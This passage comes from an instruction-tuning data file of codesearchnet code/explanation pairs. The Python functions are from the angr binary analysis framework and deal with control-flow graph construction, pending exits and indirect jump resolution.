stmt_id=DEFAULT_STATEMENT, ins_addr=ret_ins_addr)\n                    else:\n                        self._pending_edges[return_target_key].append((job.block_id, return_target_key,\n                                                                       {\n                                                                           'jumpkind': 'Ijk_Ret',\n                                                                           'stmt_id': DEFAULT_STATEMENT,\n                                                                           'ins_addr': ret_ins_addr,\n                                                                        }\n                                                                       )\n                                                                      )\n\n            else:\n                # There are no successors, but we still want to update the function graph\n                artifacts = job.sim_successors.artifacts\n                if 'irsb' in artifacts and 'insn_addrs' in artifacts and artifacts['insn_addrs']:\n                    the_irsb = artifacts['irsb']\n                    insn_addrs = artifacts['insn_addrs']\n                    self._handle_job_without_successors(job, the_irsb, insn_addrs)\n\n        # TODO: replace it with a DDG-based function IO analysis\n        # handle all actions\n        if successors:\n            self._handle_actions(successors[0],\n                                 sim_successors,\n                                 job.current_function,\n                                 job.current_stack_pointer,\n                                 set(),\n                                 )\n\n        return successors"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _post_process_successors(self, input_state, sim_successors, successors):\n\n        if sim_successors.sort == 'IRSB' and input_state.thumb:\n            successors = self._arm_thumb_filter_jump_successors(sim_successors.addr,\n                                                                sim_successors.artifacts['irsb'].size,\n                                                                successors,\n                                                                lambda state: state.scratch.ins_addr,\n                                                                lambda state: state.scratch.exit_stmt_idx\n                                                                )\n\n        # If there is a call exit, we shouldn't put the default exit (which\n        # is artificial) into the CFG. The exits will be Ijk_Call and\n        # Ijk_FakeRet, and Ijk_Call always goes first\n        extra_info = {'is_call_jump': False,\n                      'call_target': None,\n                      'return_target': None,\n                      'last_call_exit_target': None,\n                      'skip_fakeret': False,\n                      }\n\n        # Post-process jumpkind before touching all_successors\n        for suc in sim_successors.all_successors:  # we process all successors here to include potential unsat successors\n            suc_jumpkind = suc.history.jumpkind\n            if self._is_call_jumpkind(suc_jumpkind):\n                extra_info['is_call_jump'] = True\n                break\n\n        return successors, extra_info", "response": "Post - process the successors after processing the current block."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _post_handle_job_debug(self, job, successors):\n\n        sim_successors = job.sim_successors\n        call_stack_suffix = job.call_stack_suffix\n        extra_info = job.extra_info\n        successor_status = job.successor_status\n\n        func = self.project.loader.find_symbol(job.func_addr)\n        obj = self.project.loader.find_object_containing(job.addr)\n        function_name = func.name if func is not None else None\n        module_name = obj.provides if obj is not None else None\n\n        node = self.model.get_node(job.block_id)\n        depth_str = \"(D:%s)\" % node.depth if node.depth is not None else \"\"\n\n        l.debug(\"%s [%#x%s | %s]\", sim_successors.description, sim_successors.addr, depth_str,\n                \"->\".join([hex(i) for i in call_stack_suffix if i is not None])\n                )\n        l.debug(\"(Function %s of binary %s)\", function_name, module_name)\n        l.debug(\"|    Call jump: %s\", extra_info['is_call_jump'] if extra_info is not None else 'unknown')\n\n        for suc in successors:\n            jumpkind = suc.history.jumpkind\n            if jumpkind == \"Ijk_FakeRet\":\n                exit_type_str = \"Simulated Ret\"\n            else:\n                exit_type_str = \"-\"\n            try:\n                l.debug(\"|    target: %#x %s [%s] %s\", suc.solver.eval_one(suc.ip), successor_status[suc],\n                        exit_type_str, jumpkind)\n            except (SimValueError, SimSolverModeError):\n                l.debug(\"|    target cannot be concretized. %s [%s] %s\", successor_status[suc], exit_type_str,\n                        jumpkind)\n        l.debug(\"%d exits remaining, %d exits pending.\", len(self._job_info_queue), len(self._pending_jobs))\n        l.debug(\"%d unique basic blocks are analyzed so far.\", len(self._analyzed_addrs))", "response": "Print debugging information regarding the current CFGJob instance."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _iteratively_clean_pending_exits(self):\n\n        while True:\n            # did we finish analyzing any function?\n            # fill in self._completed_functions\n            self._make_completed_functions()\n\n            if self._pending_jobs:\n                # There are no more remaining jobs, but only pending jobs left. Each pending job corresponds to\n                # a previous job that does not return properly.\n                # Now it's a good time to analyze each function (that we have so far) and determine if it is a)\n                # returning, b) not returning, or c) unknown. For those functions that are definitely not returning,\n                # remove the corresponding pending exits from `pending_jobs` array. Perform this procedure iteratively\n                # until no new not-returning functions appear. Then we pick a pending exit based on the following\n                # priorities:\n                # - Job pended by a returning function\n                # - Job pended by an unknown function\n\n                new_changes = self._iteratively_analyze_function_features()\n                functions_do_not_return = new_changes['functions_do_not_return']\n\n                self._update_function_callsites(functions_do_not_return)\n\n                if not self._clean_pending_exits():\n                    # no more pending exits are removed. we are good to go!\n                    break\n            else:\n                break", "response": "Iterate through the pending exits and remove any pending exits that are not returning."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _clean_pending_exits(self):\n\n        pending_exits_to_remove = [ ]\n\n        for block_id, pe in self._pending_jobs.items():\n            if pe.returning_source is None:\n                # The original call failed. This pending exit must be followed.\n                continue\n\n            func = self.kb.functions.function(pe.returning_source)\n            if func is None:\n                # Why does it happen?\n                l.warning(\"An expected function at %s is not found. Please report it to Fish.\",\n                          hex(pe.returning_source) if pe.returning_source is not None else 'None')\n                continue\n\n            if func.returning is False:\n                # Oops, it's not returning\n                # Remove this pending exit\n                pending_exits_to_remove.append(block_id)\n\n                # We want to mark that call as not returning in the current function\n                current_function_addr = self._block_id_current_func_addr(block_id)\n                if current_function_addr is not None:\n                    current_function = self.kb.functions.function(current_function_addr)\n                    if current_function is not None:\n                        call_site_addr = self._block_id_addr(pe.src_block_id)\n                        current_function._call_sites[call_site_addr] = (func.addr, None)\n                    else:\n                        l.warning('An expected function at %#x is not found. Please report it to Fish.',\n                                  current_function_addr\n                                  )\n\n        for block_id in pending_exits_to_remove:\n            l.debug('Removing a pending exit to %#x since the target function %#x does not return',\n                    self._block_id_addr(block_id),\n                    self._pending_jobs[block_id].returning_source,\n                    )\n\n            to_remove = self._pending_jobs[block_id]\n            self._deregister_analysis_job(to_remove.caller_func_addr, to_remove)\n\n            del self._pending_jobs[block_id]\n\n        if pending_exits_to_remove:\n            return True\n        return False", "response": "Remove any pending exit that are not returning."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nhandle the successor and successors of the current job.", "response": "def _handle_successor(self, job, successor, successors):\n        \"\"\"\n        Returns a new CFGJob instance for further analysis, or None if there is no immediate state to perform the\n        analysis on.\n\n        :param CFGJob job: The current job.\n        \"\"\"\n\n        state = successor\n        all_successor_states = successors\n        addr = job.addr\n\n        # The PathWrapper instance to return\n        pw = None\n\n        job.successor_status[state] = \"\"\n\n        new_state = state.copy()\n        suc_jumpkind = state.history.jumpkind\n        suc_exit_stmt_idx = state.scratch.exit_stmt_idx\n        suc_exit_ins_addr = state.scratch.exit_ins_addr\n\n        if suc_jumpkind in {'Ijk_EmWarn', 'Ijk_NoDecode', 'Ijk_MapFail', 'Ijk_NoRedir',\n                            'Ijk_SigTRAP', 'Ijk_SigSEGV', 'Ijk_ClientReq'}:\n            # Ignore SimExits that are of these jumpkinds\n            job.successor_status[state] = \"Skipped\"\n            return [ ]\n\n        call_target = job.extra_info['call_target']\n        if suc_jumpkind == \"Ijk_FakeRet\" and call_target is not None:\n            # if the call points to a SimProcedure that doesn't return, we don't follow the fakeret anymore\n            if self.project.is_hooked(call_target):\n                sim_proc = self.project._sim_procedures[call_target]\n                if sim_proc.NO_RET:\n                    return [ ]\n\n        # Get target address\n        try:\n            target_addr = state.solver.eval_one(state.ip)\n        except (SimValueError, SimSolverModeError):\n            # It cannot be concretized currently. Maybe we can handle it later, maybe it just cannot be concretized\n            target_addr = None\n            if suc_jumpkind == \"Ijk_Ret\":\n                target_addr = job.call_stack.current_return_target\n                if target_addr is not None:\n                    new_state.ip = new_state.solver.BVV(target_addr, new_state.arch.bits)\n\n        if target_addr is None:\n            # Unlucky...\n            return [ ]\n\n        if state.thumb:\n            # Make sure addresses are always odd. It is important to encode this information in the address for the\n            # time being.\n            target_addr |= 1\n\n        # see if the target successor is in our whitelist\n        if self._address_whitelist is not None:\n            if target_addr not in self._address_whitelist:\n                l.debug(\"Successor %#x is not in the address whitelist. Skip.\", target_addr)\n                return [ ]\n\n        # see if this edge is in the base graph\n        if self._base_graph is not None:\n            # TODO: make it more efficient. the current implementation is half-assed and extremely slow\n            for src_, dst_ in self._base_graph.edges():\n                if src_.addr == addr and dst_.addr == target_addr:\n                    break\n            else:\n                # not found\n                l.debug(\"Edge (%#x -> %#x) is not found in the base graph. Skip.\", addr, target_addr)\n                return [ ]\n\n        # Fix target_addr for syscalls\n        if suc_jumpkind.startswith(\"Ijk_Sys\"):\n            syscall_proc = self.project.simos.syscall(new_state)\n            if syscall_proc is not None:\n                target_addr = syscall_proc.addr\n\n        self._pre_handle_successor_state(job.extra_info, suc_jumpkind, target_addr)\n\n        if suc_jumpkind == \"Ijk_FakeRet\":\n            if target_addr == job.extra_info['last_call_exit_target']:\n                l.debug(\"... skipping a fake return exit that has the same target with its call exit.\")\n                job.successor_status[state] = \"Skipped\"\n                return [ ]\n\n            if job.extra_info['skip_fakeret']:\n                l.debug('... skipping a fake return exit since the function it\\'s calling doesn\\'t return')\n                job.successor_status[state] = \"Skipped - non-returning function 0x%x\" % job.extra_info['call_target']\n                return [ ]\n\n        # TODO: Make it optional\n        if (suc_jumpkind == 'Ijk_Ret' and\n                    self._call_depth is not None and\n                    len(job.call_stack) <= 1\n            ):\n            # We cannot continue anymore since this is the end of the function where we started tracing\n            l.debug('... reaching the end of the starting function, skip.')\n            job.successor_status[state] = \"Skipped - reaching the end of the starting function\"\n            return [ ]\n\n        # Create the new call stack of target block\n        new_call_stack = self._create_new_call_stack(addr, all_successor_states, job, target_addr,\n                                                     suc_jumpkind)\n        # Create the callstack suffix\n        new_call_stack_suffix = new_call_stack.stack_suffix(self._context_sensitivity_level)\n        # Tuple that will be used to index this exit\n        new_tpl = self._generate_block_id(new_call_stack_suffix, target_addr, suc_jumpkind.startswith('Ijk_Sys'))\n\n        # We might have changed the mode for this basic block\n        # before. Make sure it is still running in 'fastpath' mode\n        self._reset_state_mode(new_state, 'fastpath')\n\n        pw = CFGJob(target_addr,\n                    new_state,\n                    self._context_sensitivity_level,\n                    src_block_id=job.block_id,\n                    src_exit_stmt_idx=suc_exit_stmt_idx,\n                    src_ins_addr=suc_exit_ins_addr,\n                    call_stack=new_call_stack,\n                    jumpkind=suc_jumpkind,\n                    )\n        # Special case: If the binary has symbols and the target address is a function, but for some reason (e.g.,\n        # a tail-call optimization) the CallStack's function address is still the old function address, we will have to\n        # overwrite it here.\n        if not self._is_call_jumpkind(pw.jumpkind):\n            target_symbol = self.project.loader.find_symbol(target_addr)\n            if target_symbol and target_symbol.is_function:\n                # Force update the function address\n                pw.func_addr = target_addr\n\n        # Generate new exits\n        if suc_jumpkind == \"Ijk_Ret\":\n            # This is the real return exit\n            job.successor_status[state] = \"Appended\"\n\n        elif suc_jumpkind == \"Ijk_FakeRet\":\n            # This is the default \"fake\" retn that generated at each\n            # call. Save them first, but don't process them right\n            # away\n            # st = self.project._simos.prepare_call_state(new_state, initial_state=saved_state)\n            st = new_state\n            self._reset_state_mode(st, 'fastpath')\n\n            pw = None # clear the job\n            pe = PendingJob(job.func_addr,\n                            job.extra_info['call_target'],\n                            st,\n                            job.block_id,\n                            suc_exit_stmt_idx,\n                            suc_exit_ins_addr,\n                            new_call_stack\n                            )\n            self._pending_jobs[new_tpl] = pe\n            self._register_analysis_job(pe.caller_func_addr, pe)\n            job.successor_status[state] = \"Pended\"\n\n        elif self._traced_addrs[new_call_stack_suffix][target_addr] >= 1 and suc_jumpkind == \"Ijk_Ret\":\n            # This is a corner case for the f****** ARM instruction\n            # like\n            # BLEQ <address>\n            # If we have analyzed the boring exit before returning from that called address, we will lose the link\n            # between the last block of the function being called and the basic block it returns to. We cannot\n            # reanalyze the basic block as we are not flow-sensitive, but we can still record the connection and make\n            # for it afterwards.\n            pass\n\n        else:\n            job.successor_status[state] = \"Appended\"\n\n        if job.extra_info['is_call_jump'] and job.extra_info['call_target'] in self._non_returning_functions:\n            job.extra_info['skip_fakeret'] = True\n\n        if not pw:\n            return [ ]\n\n        if self._base_graph is not None:\n            # remove all existing jobs that has the same block ID\n            if next((en for en in self.jobs if en.block_id == pw.block_id), None):\n                # TODO: this is very hackish. Reimplement this logic later\n                self._job_info_queue = [entry for entry in self._job_info_queue if entry.job.block_id != pw.block_id]\n\n        # register the job\n        self._register_analysis_job(pw.func_addr, pw)\n\n        return [ pw ]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _handle_job_without_successors(self, job, irsb, insn_addrs):\n\n        # it's not an empty block\n\n        # handle all conditional exits\n        ins_addr = job.addr\n        for stmt_idx, stmt in enumerate(irsb.statements):\n            if type(stmt) is pyvex.IRStmt.IMark:\n                ins_addr = stmt.addr + stmt.delta\n            elif type(stmt) is pyvex.IRStmt.Exit:\n                successor_jumpkind = stmt.jk\n                self._update_function_transition_graph(\n                    job.block_id, None,\n                    jumpkind = successor_jumpkind,\n                    ins_addr=ins_addr,\n                    stmt_idx=stmt_idx,\n                )\n\n        # handle the default exit\n        successor_jumpkind = irsb.jumpkind\n        successor_last_ins_addr = insn_addrs[-1]\n        self._update_function_transition_graph(job.block_id, None,\n                                               jumpkind=successor_jumpkind,\n                                               ins_addr=successor_last_ins_addr,\n                                               stmt_idx=DEFAULT_STATEMENT,\n                                               )", "response": "Handle a CFGJob that has no successors."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _handle_actions(self, state, current_run, func, sp_addr, accessed_registers):\n        se = state.solver\n\n        if func is not None and sp_addr is not None:\n\n            # Fix the stack pointer (for example, skip the return address on the stack)\n            new_sp_addr = sp_addr + self.project.arch.call_sp_fix\n\n            actions = [a for a in state.history.recent_actions if a.bbl_addr == current_run.addr]\n\n            for a in actions:\n                if a.type == \"mem\" and a.action == \"read\":\n                    try:\n                        addr = se.eval_one(a.addr.ast, default=0)\n                    except (claripy.ClaripyError, SimSolverModeError):\n                        continue\n                    if (self.project.arch.call_pushes_ret and addr >= new_sp_addr) or \\\n                            (not self.project.arch.call_pushes_ret and addr >= new_sp_addr):\n                        # TODO: What if a variable locates higher than the stack is modified as well? We probably want\n                        # TODO: to make sure the accessing address falls in the range of stack\n                        offset = addr - new_sp_addr\n                        func._add_argument_stack_variable(offset)\n                elif a.type == \"reg\":\n                    offset = a.offset\n                    if a.action == \"read\" and offset not in accessed_registers:\n                        func._add_argument_register(offset)\n                    elif a.action == \"write\":\n                        accessed_registers.add(offset)\n        else:\n            l.error(\n                \"handle_actions: Function not found, or stack pointer is None. It might indicates unbalanced stack.\")", "response": "This method handles the actions that are appropriate for the current function and the stack pointer address."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the transition graph of functions in function manager based on information passed in.", "response": "def _update_function_transition_graph(self, src_node_key, dst_node_key, jumpkind='Ijk_Boring', ins_addr=None,\n                                          stmt_idx=None, confirmed=None):\n        \"\"\"\n        Update transition graphs of functions in function manager based on information passed in.\n\n        :param str jumpkind: Jumpkind.\n        :param CFGNode src_node: Source CFGNode\n        :param CFGNode dst_node: Destionation CFGNode\n        :param int ret_addr: The theoretical return address for calls\n        :return: None\n        \"\"\"\n\n        if dst_node_key is not None:\n            dst_node = self._graph_get_node(dst_node_key, terminator_for_nonexistent_node=True)\n            dst_node_addr = dst_node.addr\n            dst_codenode = dst_node.to_codenode()\n            dst_node_func_addr = dst_node.function_address\n        else:\n            dst_node = None\n            dst_node_addr = None\n            dst_codenode = None\n            dst_node_func_addr = None\n\n        if src_node_key is None:\n            if dst_node is None:\n                raise ValueError(\"Either src_node_key or dst_node_key must be specified.\")\n            self.kb.functions.function(dst_node.function_address, create=True)._register_nodes(True,\n                                                                                               dst_codenode\n                                                                                               )\n            return\n\n        src_node = self._graph_get_node(src_node_key, terminator_for_nonexistent_node=True)\n\n        # Update the transition graph of current function\n        if jumpkind == \"Ijk_Call\":\n            ret_addr = src_node.return_target\n            ret_node = self.kb.functions.function(\n                src_node.function_address,\n                create=True\n            )._get_block(ret_addr).codenode if ret_addr else None\n\n            self.kb.functions._add_call_to(\n                function_addr=src_node.function_address,\n                from_node=src_node.to_codenode(),\n                to_addr=dst_node_addr,\n                retn_node=ret_node,\n                syscall=False,\n                ins_addr=ins_addr,\n                stmt_idx=stmt_idx,\n            )\n\n        if jumpkind.startswith('Ijk_Sys'):\n\n            self.kb.functions._add_call_to(\n                function_addr=src_node.function_address,\n                from_node=src_node.to_codenode(),\n                to_addr=dst_node_addr,\n                retn_node=src_node.to_codenode(),  # For syscalls, they are returning to the address of themselves\n                syscall=True,\n                ins_addr=ins_addr,\n                stmt_idx=stmt_idx,\n            )\n\n        elif jumpkind == 'Ijk_Ret':\n            # Create a return site for current function\n            self.kb.functions._add_return_from(\n                function_addr=src_node.function_address,\n                from_node=src_node.to_codenode(),\n                to_node=dst_codenode,\n            )\n\n            if dst_node is not None:\n                # Create a returning edge in the caller function\n                self.kb.functions._add_return_from_call(\n                    function_addr=dst_node_func_addr,\n                    src_function_addr=src_node.function_address,\n                    to_node=dst_codenode,\n                )\n\n        elif jumpkind == 'Ijk_FakeRet':\n            self.kb.functions._add_fakeret_to(\n                function_addr=src_node.function_address,\n                from_node=src_node.to_codenode(),\n                to_node=dst_codenode,\n                confirmed=confirmed,\n            )\n\n        elif jumpkind in ('Ijk_Boring', 'Ijk_InvalICache'):\n\n            src_obj = self.project.loader.find_object_containing(src_node.addr)\n            dest_obj = self.project.loader.find_object_containing(dst_node.addr) if dst_node is not None else None\n\n            if src_obj is dest_obj:\n                # Jump/branch within the same object. Might be an outside jump.\n                to_outside = src_node.function_address != dst_node_func_addr\n            else:\n                # Jump/branch between different objects. Must be an outside jump.\n                to_outside = True\n\n            if not to_outside:\n                self.kb.functions._add_transition_to(\n                    function_addr=src_node.function_address,\n                    from_node=src_node.to_codenode(),\n                    to_node=dst_codenode,\n                    ins_addr=ins_addr,\n                    stmt_idx=stmt_idx,\n                )\n\n            else:\n                self.kb.functions._add_outside_transition_to(\n                    function_addr=src_node.function_address,\n                    from_node=src_node.to_codenode(),\n                    to_node=dst_codenode,\n                    to_function_addr=dst_node_func_addr,\n                    ins_addr=ins_addr,\n                    stmt_idx=stmt_idx,\n                )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _update_function_callsites(self, noreturns):\n\n        for callee_func in noreturns:\n            # consult the callgraph to find callers of each function\n            if callee_func.addr not in self.functions.callgraph:\n                continue\n            caller_addrs = self.functions.callgraph.predecessors(callee_func.addr)\n            for caller_addr in caller_addrs:\n                caller = self.functions[caller_addr]\n                if callee_func not in caller.transition_graph:\n                    continue\n                callsites = caller.transition_graph.predecessors(callee_func)\n                for callsite in callsites:\n                    caller._add_call_site(callsite.addr, callee_func.addr, None)", "response": "Update the callsites of functions that are just deemed not\n        returning."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nthrows away all successors whose target doesn t make sense", "response": "def _filter_insane_successors(self, successors):\n        \"\"\"\n        Throw away all successors whose target doesn't make sense\n\n        This method is called after we resolve an indirect jump using an unreliable method (like, not through one of\n        the indirect jump resolvers, but through either pure concrete execution or backward slicing) to filter out the\n        obviously incorrect successors.\n\n        :param list successors: A collection of successors.\n        :return:                A filtered list of successors\n        :rtype:                 list\n        \"\"\"\n\n        old_successors = successors[::]\n        successors = [ ]\n        for i, suc in enumerate(old_successors):\n            if suc.solver.symbolic(suc.ip):\n                # It's symbolic. Take it, and hopefully we can resolve it later\n                successors.append(suc)\n\n            else:\n                ip_int = suc.solver.eval_one(suc.ip)\n\n                if self._is_address_executable(ip_int) or \\\n                        self.project.is_hooked(ip_int) or \\\n                        self.project.simos.is_syscall_addr(ip_int):\n                    successors.append(suc)\n                else:\n                    l.debug('An obviously incorrect successor %d/%d (%#x) is ditched',\n                            i + 1,\n                            len(old_successors),\n                            ip_int\n                            )\n\n        return successors"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _remove_non_return_edges(self):\n        for func in self.kb.functions.values():\n            graph = func.transition_graph\n            all_return_edges = [(u, v) for (u, v, data) in graph.edges(data=True) if data['type'] == 'return_from_call']\n            for return_from_call_edge in all_return_edges:\n                callsite_block_addr, return_to_addr = return_from_call_edge\n                call_func_addr = func.get_call_target(callsite_block_addr)\n                if call_func_addr is None:\n                    continue\n\n                call_func = self.kb.functions.function(call_func_addr)\n                if call_func is None:\n                    # Weird...\n                    continue\n\n                if call_func.returning is False:\n                    # Remove that edge!\n                    graph.remove_edge(call_func_addr, return_to_addr)\n                    # Remove the edge in CFG\n                    nodes = self.get_all_nodes(callsite_block_addr)\n                    for n in nodes:\n                        successors = self.get_successors_and_jumpkind(n, excluding_fakeret=False)\n                        for successor, jumpkind in successors:\n                            if jumpkind == 'Ijk_FakeRet' and successor.addr == return_to_addr:\n                                self.remove_edge(n, successor)", "response": "Remove all return_from_call edges that actually do not return due to a call_from_call call."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _convert_indirect_jump_targets_to_states(job, indirect_jump_targets):\n\n        successors = [ ]\n        for t in indirect_jump_targets:\n            # Insert new successors\n            a = job.sim_successors.all_successors[0].copy()\n            a.ip = t\n            successors.append(a)\n        return successors", "response": "Converts each concrete indirect jump target into a list of SimStates."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _try_resolving_indirect_jumps(self, sim_successors, cfg_node, func_addr, successors, exception_info, artifacts):\n\n        # Try to resolve indirect jumps with advanced backward slicing (if enabled)\n        if sim_successors.sort == 'IRSB' and \\\n                self._is_indirect_jump(cfg_node, sim_successors):\n            l.debug('IRSB %#x has an indirect jump as its default exit', cfg_node.addr)\n\n            # We need input states to perform backward slicing\n            if self._advanced_backward_slicing and self._keep_state:\n\n                # Optimization: make sure we only try to resolve an indirect jump if any of the following criteria holds\n                # - It's a jump (Ijk_Boring), and its target is either fully symbolic, or its resolved target is within\n                #   the current binary\n                # - It's a call (Ijk_Call), and its target is fully symbolic\n                # TODO: This is very hackish, please refactor this part of code later\n                should_resolve = True\n                legit_successors = [suc for suc in successors if suc.history.jumpkind in ('Ijk_Boring', 'Ijk_InvalICache', 'Ijk_Call')]\n                if legit_successors:\n                    legit_successor = legit_successors[0]\n                    if legit_successor.ip.symbolic:\n                        if not legit_successor.history.jumpkind == 'Ijk_Call':\n                            should_resolve = False\n                    else:\n                        if legit_successor.history.jumpkind == 'Ijk_Call':\n                            should_resolve = False\n                        else:\n                            concrete_target = legit_successor.solver.eval(legit_successor.ip)\n                            if not self.project.loader.find_object_containing(\n                                    concrete_target) is self.project.loader.main_object:\n                                should_resolve = False\n\n                else:\n                    # No interesting successors... skip\n                    should_resolve = False\n\n                # TODO: Handle those successors\n                if not should_resolve:\n                    l.debug(\"This might not be an indirect jump that has multiple targets. Skipped.\")\n                    self.kb.unresolved_indirect_jumps.add(cfg_node.addr)\n\n                else:\n                    more_successors = self._backward_slice_indirect(cfg_node, sim_successors, func_addr)\n\n                    if more_successors:\n                        # Remove the symbolic successor\n                        # TODO: Now we are removing all symbolic successors. Is it possible\n                        # TODO: that there is more than one symbolic successor?\n                        all_successors = [suc for suc in successors if not suc.solver.symbolic(suc.ip)]\n                        # Insert new successors\n                        # We insert new successors in the beginning of all_successors list so that we don't break the\n                        # assumption that Ijk_FakeRet is always the last element in the list\n                        for suc_addr in more_successors:\n                            a = sim_successors.all_successors[0].copy()\n                            a.ip = suc_addr\n                            all_successors.insert(0, a)\n\n                        l.debug('The indirect jump is successfully resolved.')\n\n                        self.kb.resolved_indirect_jumps.add(cfg_node.addr)\n\n                    else:\n                        l.debug('Failed to resolve the indirect jump.')\n                        self.kb.unresolved_indirect_jumps.add(cfg_node.addr)\n\n            else:\n                if not successors:\n                    l.debug('Cannot resolve the indirect jump without advanced backward slicing enabled: %s',\n                            cfg_node)\n\n        # Try to find more successors if we failed to resolve the indirect jump before\n        if exception_info is None and (cfg_node.is_simprocedure or self._is_indirect_jump(cfg_node, sim_successors)):\n            has_call_jumps = any(suc_state.history.jumpkind == 'Ijk_Call' for suc_state in successors)\n            if has_call_jumps:\n                concrete_successors = [suc_state for suc_state in successors if\n                                       suc_state.history.jumpkind != 'Ijk_FakeRet' and not suc_state.solver.symbolic(\n                                           suc_state.ip)]\n            else:\n                concrete_successors = [suc_state for suc_state in successors if\n                                       not suc_state.solver.symbolic(suc_state.ip)]\n            symbolic_successors = [suc_state for suc_state in successors if suc_state.solver.symbolic(suc_state.ip)]\n\n            resolved = True if not symbolic_successors else False\n            if symbolic_successors:\n                for suc in symbolic_successors:\n                    if o.SYMBOLIC in suc.options:\n                        targets = suc.solver.eval_upto(suc.ip, 32)\n                        if len(targets) < 32:\n                            all_successors = []\n                            resolved = True\n                            for t in targets:\n                                new_ex = suc.copy()\n                                new_ex.ip = suc.solver.BVV(t, suc.ip.size())\n                                all_successors.append(new_ex)\n                        else:\n                            break\n\n            if not resolved and (\n                        (symbolic_successors and not concrete_successors) or\n                        (not cfg_node.is_simprocedure and self._is_indirect_jump(cfg_node, sim_successors))\n            ):\n                l.debug(\"%s has an indirect jump. See what we can do about it.\", cfg_node)\n\n                if sim_successors.sort == 'SimProcedure' and \\\n                        sim_successors.artifacts['adds_exits']:\n                    # Skip those SimProcedures that don't create new SimExits\n                    l.debug('We got a SimProcedure %s in fastpath mode that creates new exits.', sim_successors.description)\n                    if self._enable_symbolic_back_traversal:\n                        successors = self._symbolically_back_traverse(sim_successors, artifacts, cfg_node)\n                        # mark jump as resolved if we got successors\n                        if successors:\n                            self.kb.resolved_indirect_jumps.add(cfg_node.addr)\n                        else:\n                            self.kb.unresolved_indirect_jumps.add(cfg_node.addr)\n                        l.debug(\"Got %d concrete exits in symbolic mode.\", len(successors))\n                    else:\n                        self.kb.unresolved_indirect_jumps.add(cfg_node.addr)\n                        # keep fake_rets\n                        successors = [s for s in successors if s.history.jumpkind == \"Ijk_FakeRet\"]\n\n                elif sim_successors.sort == 'IRSB'and \\\n                        any([ex.history.jumpkind != 'Ijk_Ret' for ex in successors]):\n                    # We cannot properly handle Return as that requires us start execution from the caller...\n                    l.debug(\"Try traversal backwards in symbolic mode on %s.\", cfg_node)\n                    if self._enable_symbolic_back_traversal:\n                        successors = self._symbolically_back_traverse(sim_successors, artifacts, cfg_node)\n\n                        # Remove successors whose IP doesn't make sense\n                        successors = [suc for suc in successors\n                                          if self._is_address_executable(suc.solver.eval_one(suc.ip))]\n\n                        # mark jump as resolved if we got successors\n                        if successors:\n                            self.kb.resolved_indirect_jumps.add(cfg_node.addr)\n                        else:\n                            self.kb.unresolved_indirect_jumps.add(cfg_node.addr)\n                        l.debug('Got %d concrete exits in symbolic mode', len(successors))\n                    else:\n                        self.kb.unresolved_indirect_jumps.add(cfg_node.addr)\n                        successors = []\n\n                elif successors and all([ex.history.jumpkind == 'Ijk_Ret' for ex in successors]):\n                    l.debug('All exits are returns (Ijk_Ret). It will be handled by pending exits.')\n\n                else:\n                    l.debug('Cannot resolve this indirect jump: %s', cfg_node)\n                    self.kb.unresolved_indirect_jumps.add(cfg_node.addr)\n\n        return successors", "response": "Try to resolve indirect jumps."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nresolves an indirect jump by slicing backwards from the end of the current function.", "response": "def _backward_slice_indirect(self, cfgnode, sim_successors, current_function_addr):\n        \"\"\"\n        Try to resolve an indirect jump by slicing backwards\n        \"\"\"\n        # TODO: make this a real indirect jump resolver under the new paradigm\n\n        irsb = sim_successors.artifacts['irsb']  # shorthand\n\n        l.debug(\"Resolving indirect jump at IRSB %s\", irsb)\n\n        # Let's slice backwards from the end of this exit\n        next_tmp = irsb.next.tmp\n        stmt_id = [i for i, s in enumerate(irsb.statements)\n                   if isinstance(s, pyvex.IRStmt.WrTmp) and s.tmp == next_tmp][0]\n\n        cdg = self.project.analyses.CDG(cfg=self, fail_fast=self._fail_fast)\n        ddg = self.project.analyses.DDG(cfg=self, start=current_function_addr, call_depth=0, fail_fast=self._fail_fast)\n\n        bc = self.project.analyses.BackwardSlice(self,\n                                                 cdg,\n                                                 ddg,\n                                                 targets=[(cfgnode, stmt_id)],\n                                                 same_function=True,\n                                                 fail_fast=self._fail_fast)\n        taint_graph = bc.taint_graph\n        # Find the correct taint\n        next_nodes = [cl for cl in taint_graph.nodes() if cl.block_addr == sim_successors.addr]\n\n        if not next_nodes:\n            l.error('The target exit is not included in the slice. Something is wrong')\n            return []\n\n        next_node = next_nodes[0]\n\n        # Get the weakly-connected subgraph that contains `next_node`\n        all_subgraphs = networkx.weakly_connected_component_subgraphs(taint_graph)\n        starts = set()\n        for subgraph in all_subgraphs:\n            if next_node in subgraph:\n                # Make sure there is no symbolic read...\n                # FIXME: This is an over-approximation. We should try to limit the starts more\n                nodes = [n for n in subgraph.nodes() if subgraph.in_degree(n) == 0]\n                for n in nodes:\n                    starts.add(n.block_addr)\n\n        # Execute the slice\n        successing_addresses = set()\n        annotated_cfg = bc.annotated_cfg()\n        for start in starts:\n            l.debug('Start symbolic execution at 0x%x on program slice.', start)\n            # Get the state from our CFG\n            node = self.get_any_node(start)\n            if node is None:\n                # Well, we have to live with an empty state\n                base_state = self.project.factory.blank_state(addr=start)\n            else:\n                base_state = node.input_state.copy()\n                base_state.set_mode('symbolic')\n                base_state.ip = start\n\n                # Clear all initial taints (register values, memory values, etc.)\n                initial_nodes = [n for n in bc.taint_graph.nodes() if bc.taint_graph.in_degree(n) == 0]\n                for cl in initial_nodes:\n                    # Iterate in all actions of this node, and pick corresponding actions\n                    cfg_nodes = self.get_all_nodes(cl.block_addr)\n                    for n in cfg_nodes:\n                        if not 